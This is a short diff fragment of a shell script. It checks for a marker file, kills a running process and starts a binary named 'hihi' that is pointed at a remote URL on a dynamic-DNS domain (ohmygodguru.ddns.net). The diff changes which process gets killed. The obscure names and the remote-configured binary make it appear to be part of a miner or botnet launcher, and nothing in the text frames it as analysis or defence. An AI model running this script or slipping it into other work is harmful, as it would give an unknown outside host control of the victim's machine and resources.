@@ -13,7 +13,7 @@
 if [ -f ${PWD}/kaka ]; then
     if pgrep -x "hihi" > /dev/null
 then
-pkill lulu
+pkill hihi
 echo " kill process"
 ./hihi -F http://ohmygodguru.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
